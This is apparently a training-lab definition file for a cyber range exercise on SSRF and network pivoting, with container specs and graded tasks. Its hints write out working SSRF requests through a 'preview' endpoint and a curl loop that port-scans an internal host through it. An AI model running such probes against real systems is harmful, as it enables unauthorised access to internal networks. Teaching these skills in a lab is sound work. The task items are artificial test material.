@@ -1,0 +1,74 @@
+id: pivot-ssrf
+title: "Pivoting: reach the hidden network"
+level: advanced
+minutes: 45
+topic: networking
+summary: A server you can't reach sits on an internal network. Abuse a web app's link preview (SSRF) to get in, then scan through it.
+skills: [network segmentation, SSRF, pivoting, port scanning through a proxy, curl]
+introduction: |
+  Real networks are split into segments. Your machine "attacker" is on the outer network
+  (the DMZ). The web app "jump" is on the DMZ **and** on an internal network. The server
+  "vault" is only on the internal network: from your machine it simply isn't there.
+
+  Attackers get in by finding a machine that sits on both sides and making it work for them.
+  This is called pivoting. Here the way in is a "link preview" feature that fetches any URL
+  you give it, from the server's side. That weakness is called SSRF (server-side request
+  forgery) and is among the most common serious web bugs today.
+
+  Fewer hints: try first, then open them.
+spec:
+  environments:
+    - name: attacker
+      baseImage: ubuntu-24-04
+      resources: {cpu: 0.5, memoryMiB: 512, storageGiB: 3}
+      toolPacks: [net-basics]
+      network: {mode: lab, segments: [dmz]}
+      lifecycle: {idleTimeoutMinutes: 90, ttlHours: 24}
+    - name: jump
+      role: target
+      baseImage: lab-target
+      resources: {cpu: 0.25, memoryMiB: 128, storageGiB: 1}
+      network: {mode: lab, segments: [dmz, internal]}
+      access: {terminal: false}
+      lifecycle: {idleTimeoutMinutes: 90, ttlHours: 24}
+    - name: vault
+      role: target
+      baseImage: lab-target
+      resources: {cpu: 0.25, memoryMiB: 128, storageGiB: 1}
+      network: {mode: lab, segments: [internal]}
+      access: {terminal: false}
+      lifecycle: {idleTimeoutMinutes: 90, ttlHours: 24}
+  workspace: {storageGiB: 1}
+setup:
+  - environment: jump
+    path: .cyberlab-target.json
+    generator: pivot-jump
+  - environment: vault
+    path: .cyberlab-target.json
+    generator: pivot-vault
+tasks:
+  - id: internal-flag
+    title: Read the internal server
+    text: |
+      First check that `curl http://vault/` fails from your machine: it is on another network.
+      Then look at the web app on `jump` and use its preview feature to read vault's home page.
+    answer: internal-flag
+    hints:
+      - "`curl http://jump/` and read the page source."
+      - "`curl \"http://jump/preview?url=http://vault/\"`"
+  - id: admin-port
+    title: Scan through the pivot
+    text: |
+      Vault's home page mentions an admin console on a port in the 8000s. You can't run nmap
+      on vault. Use the preview to try ports one by one. Which port is it?
+    answer: admin-port
+    answerFormat: a port number
+    hints:
+      - "A failed connection answers \"could not connect\"; an open port answers something else."
+      - "`for p in $(seq 8000 8099); do echo -n \"$p \"; curl -s \"http://jump/preview?url=http://vault:$p/\" | head -1; done | grep -v 'could not'`"
+  - id: admin-flag
+    title: The admin flag
+    text: Read the admin console's page through the preview.
+    answer: admin-flag
+    hints:
+      - "`curl \"http://jump/preview?url=http://vault:<port>/\"`"
